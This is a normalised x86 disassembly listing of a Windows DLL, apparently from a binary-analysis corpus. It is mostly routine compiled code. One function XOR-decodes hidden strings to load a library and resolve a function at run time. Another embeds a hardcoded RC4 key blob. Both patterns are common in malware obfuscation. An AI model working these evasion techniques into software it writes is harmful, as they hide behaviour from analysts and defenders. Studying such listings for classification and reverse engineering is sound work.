cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1000447b
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_10002a6f
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_1006e5c0
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1001462a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100820fc
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10014670
push esi
mov esi [ eax ]
push edi
mov edi ecx
test esi esi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
pop edi
lea eax [ esi + 0x1 ]
pop esi
retn
mov ebx [ esi ]
mov edx edi
call sub_10056b30
mov edi [ edi ]
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
retn
mov ebx edi
mov edi [ esi ]
call sub_10047e30
mov ecx [ edi + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call ebx
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ esi + 0x2 ]
pop esi
retn
sub_100146d0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10014730
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100362a0
mov [ esi + 0x4 ] edi
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f5d0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_100147bf
push 0x38
mov eax sub_1008584a
call sub_1003fae8
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006f961
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10034a80
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1004642f
retn 0x20
sub_10014880
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x34 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x38 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0x38 ]
push ebx
mov ebx [ ebp - 0x34 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10046920
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x2c0 ] ebx
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] ebx
mov [ esi + 0x2c4 ] cx
mov [ esi + 0x2e4 ] bl
mov ecx [ r--data ]
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x24
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x1c ] ax
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x34 ] eax
mov [ esi + 0x2c0 ] eax
cmp eax ebx
je r-xdata
mov eax esi
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov al [ ecx + edi ]
xor al dl
xor al 0x4c
inc dl
mov [ ebp + ecx - 0x18 ] al
movzx ecx dl
cmp ecx 0x12
jb r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x6 ] bl
call [ GetProcAddress@IAT ]
mov [ esi + 0x2e0 ] eax
cmp eax ebx
mov eax esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
pop edi
mov [ esi + 0x2e4 ] 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
sub_100149a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10086830
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x24 ]
mov ebx [ ebp + 0x20 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x30 ] ecx
mov ecx [ ebp + 0x18 ]
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x2c ] ecx
mov [ esp + 0x18 ] edx
call sub_10013950
push eax
mov [ esp + 0x6c ] 0x0
call sub_10002fc0
mov [ esp + 0x6c ] 0xffffffff
mov edi [ esp + 0x30 ]
add esp 0x4
mov [ esp + 0x34 ] eax
test edi edi
je r-xdata
lea ecx [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x38 ]
call sub_100101d0
mov ecx 0x1
mov [ esp + 0x68 ] ecx
mov al [ ebx ]
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ esp + 0x20 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x18 ] ecx
cmp al 0x2d
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x1c ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x3c ]
cmp al 0x30
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x28 ]
mov esi [ eax + 0x20 ]
mov ecx eax
cmp [ ecx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x3c ]
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x3c ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ esp + 0x18 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
movzx eax ax
push eax
mov eax [ esp + 0x18 ]
push eax
push ebx
mov ebx [ esp + 0x30 ]
push ecx
push edx
lea eax [ esp + 0x48 ]
push eax
push ebx
call sub_100344d0
mov ecx [ eax ]
mov edx [ esp + 0x44 ]
add esp 0x1c
push esi
mov esi [ esp + 0x34 ]
push edi
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push esi
push ebx
mov [ ebp + 0x14 ] eax
mov [ edx + 0x20 ] 0x0
mov [ edx + 0x24 ] 0x0
call sub_10070c30
add esp 0x18
cmp [ esp + 0x50 ] 0x10
jb r-xdata
cmp eax 0x100
je r-xdata
mov eax [ esp + 0x14 ]
cmp esi eax
jbe r-xdata
test esi esi
je r-xdata
cmp ecx 0x10
jae r-xdata
mov eax esi
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x3c ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ esp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
push ebx
push edx
mov edx [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push edx
call sub_1006e7c0
mov ecx [ eax ]
add ebx [ esp + 0x30 ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x30 ]
sub [ esp + 0x2c ] ecx
push esi
mov [ ebp + 0x14 ] edx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edi
push edx
mov edx [ esp + 0x48 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edx
call sub_10070c30
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x30
mov [ ebp + 0x14 ] edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
push edi
push ecx
mov ecx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x2c ]
push eax
push ecx
call sub_10070c30
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
jmp r-xdata
sub esi eax
jmp r-xdata
mov esi [ esp + 0x14 ]
mov eax edx
mov al [ eax ]
mov [ esp + 0x1c ] edx
cmp al 0x7f
je r-xdata
lea edx [ esp + 0x3c ]
xor esi esi
mov eax [ ecx + 0x14 ]
mov edi [ ebp + 0x1c ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ esp + 0x18 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax [ esp + 0x14 ]
sub eax esi
inc eax
push eax
lea edi [ ebx + esi ]
push edi
push eax
lea edx [ ebx + esi + 0x1 ]
push edx
call sub_100060f2
mov eax [ esp + 0x2c ]
inc [ esp + 0x24 ]
add esp 0x10
mov [ edi ] 0x0
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ esp + 0x1c ] eax
sub_10014c90
push ebp
mov ebp esp
push 0xffffffff
push sub_10086560
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_1004d880
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10014f20
push ebp
mov ebp esp
push 0xffffffff
push sub_10088ffd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
mov edi ecx
xor ebx ebx
push ebx
mov [ ebp - 0x2fc ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x218 ]
push ebx
push ecx
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10036cc0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] esi
mov edi [ ebp - 0x2e0 ]
cmp edi ebx
je r-xdata
or esi 0xffffffff
mov [ ebp - 0x4 ] esi
push eax
lea ecx [ ebp - 0x2e4 ]
mov [ ebp - 0x2e4 ] ebx
mov [ ebp - 0x2e0 ] ebx
call sub_10023120
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2e4 ] ebx
jne r-xdata
push 0x1
call sub_1001f84c
add esp 0x4
push eax
lea ecx [ ebp - 0x2ec ]
mov [ ebp - 0x2ec ] ebx
mov [ ebp - 0x2e8 ] ebx
call sub_10052fd0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x2ec ] ebx
jne r-xdata
mov [ ebp - 0x4 ] esi
mov edi [ ebp - 0x2e0 ]
cmp edi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ edi + 0x4 ]
mov ecx esi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea ecx [ ebp - 0x2e4 ]
call sub_1000b470
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10006f30
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ edi + 0x4 ]
mov eax esi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
[ ecx ] esi
jne r-xdata
mov ebx [ ebp - 0x2e4 ]
call sub_1000aaa0
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10006f30
mov eax 0x4
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
[ ecx ] esi
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10006f30
mov eax 0x5
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
mov eax edi
mov eax [ edi ]
jmp r-xdata
push eax
call ebx
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x2f0 ] eax
call sub_10019100
lea ecx [ ebp - 0x26c ]
call sub_10019100
lea ecx [ ebp - 0x2a4 ]
call sub_10019100
xor ecx ecx
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
mov [ ebp - 0x234 ] cx
mov edi [ ebp - 0x2fc ]
push 0xffffffff
push ecx
lea edx [ edi + 0x3c ]
push edx
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x4 ] 0x5
call sub_100404a0
push 0xffffffff
push 0x0
lea eax [ edi + 0x58 ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_10017b50
mov eax [ ebp - 0x234 ]
cmp [ ebp - 0x220 ] esi
jae r-xdata
mov eax [ eax ]
mov ebx [ SysAllocString@IAT ]
push eax
call ebx
movzx edx [ edi + 0x38 ]
push edx
lea esi [ ebp - 0x2a4 ]
mov [ ebp - 0x300 ] eax
call sub_10045cc0
add esp 0x4
mov esi eax
push r--data
add edi 0x1c
lea eax [ ebp - 0x26c ]
push edi
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10022b70
add esp 0xc
mov ecx eax
mov eax esi
lea edi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x4
call sub_10057920
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call ebx
push r--data
mov [ ebp - 0x2f4 ] eax
call ebx
movzx ecx [ edi + 0x74 ]
push ecx
lea esi [ ebp - 0x2c0 ]
mov [ ebp - 0x2f8 ] eax
call sub_10045cc0
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x234 ]
push eax
call ebx
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x304 ] eax
call sub_10019100
mov edx [ edi + 0x78 ]
push edx
lea esi [ ebp - 0x2dc ]
call sub_10045cc0
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x2dc ]
mov edi eax
call sub_10019100
mov eax [ ebp - 0x2fc ]
mov ecx [ eax + 0x7c ]
push ecx
lea esi [ ebp - 0x288 ]
call sub_10045cc0
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x288 ]
mov esi eax
call sub_10019100
mov ebx [ ebp - 0x304 ]
mov edx [ ebp - 0x2f0 ]
mov eax [ ebp - 0x300 ]
mov ecx [ ebp - 0x2f4 ]
push esi
push edi
push ebx
push edx
mov edx [ ebp - 0x2f8 ]
push eax
lea esi [ ebp - 0x328 ]
call sub_1003e9a0
mov ecx [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x6
mov esi [ SysFreeString@IAT ]
push ecx
call esi
mov edx [ ebp - 0x2f0 ]
push edx
call esi
mov eax [ ebp - 0x2f4 ]
push eax
call esi
mov ecx [ ebp - 0x2f8 ]
push ecx
call esi
push ebx
call esi
push edi
call esi
mov eax [ ebp - 0x2e4 ]
lea edx [ ebp - 0x328 ]
add eax 0x128
push edx
call sub_10036c10
lea ecx [ ebp - 0x2e4 ]
call sub_100534d0
test eax eax
lea eax [ ebp - 0x328 ]
je r-xdata
mov eax [ eax ]
call sub_10046140
lea ecx [ ebp - 0x234 ]
call sub_10019100
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
xor eax eax
call sub_10046140
lea ecx [ ebp - 0x234 ]
call sub_10019100
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax 0x6
jmp r-xdata
sub_100153c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008986e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xac ] ecx
lea edi [ ebp - 0xac ]
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0xb4 ] edx
mov [ ebp - 0xa8 ] eax
call sub_10060060
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
push 0x2c
call sub_1001f84c
add esp 0x4
cmp eax edi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x138
call sub_10045930
lea ecx [ ebp - 0xa4 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x50 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0xf ]
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x58 ] esi
jb r-xdata
xor eax eax
mov ecx [ ebp - 0xac ]
mov edx [ ebp - 0xb0 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] edi
mov [ eax + 0x24 ] edi
jmp r-xdata
xor eax eax
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] ax
cmp [ ebp - 0x90 ] esi
jb r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_100187af
add esp 0x4
lea esi [ ebp - 0x60 ]
call sub_10036f00
mov esi [ ebp - 0xa8 ]
mov ebx eax
mov [ ebp - 0x4 ] 0x3
call sub_10013440
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x60 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x125
call sub_10045930
xor eax eax
mov [ ebp - 0x6c ] ax
mov eax edx
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x5c ] edi
lea edx [ eax + 0x2 ]
mov [ rw-data ] eax
call sub_1001ba50
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_100187af
add esp 0x4
mov esi [ rw-data ]
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x58 ] edi
cmp esi edi
je r-xdata
mov edi [ ebp - 0x5c ]
call sub_100699f0
mov eax [ ebp - 0x60 ]
push eax
call sub_100187af
add esp 0x4
xor edi edi
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x50 ]
push ecx
lea ecx [ ebp - 0x6c ]
call sub_1005ddc0
lea edx [ ebp - 0x6c ]
mov ecx 0xf
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
cmp [ ebp - 0x58 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0x64 ]
mov eax 0x56
mov [ rw-data ] edi
call sub_10045930
mov eax [ ebp - 0xa8 ]
mov esi [ eax ]
cmp esi [ eax + 0x4 ]
je r-xdata
call sub_100121a0
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_100187af
add esp 0x4
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x64 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ ebp - 0x64 ]
push ecx
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx esi
call sub_1001a2f0
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov esi [ esi + 0x1c ]
shr eax 0x1
xor ecx ecx
push eax
mov [ ebp - 0x88 ] cx
push esi
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] 0x0
call sub_1005ddc0
mov ecx [ ebp - 0xb4 ]
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x4 ] 0x4
call sub_100649e0
cmp [ ebp - 0x74 ] 0x8
jb r-xdata
mov edx [ ebp - 0xa8 ]
add esi 0x24
cmp esi [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x88 ]
push eax
call sub_100187af
add esp 0x4
xor edi edi
jmp r-xdata
sub_100156a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084e5c
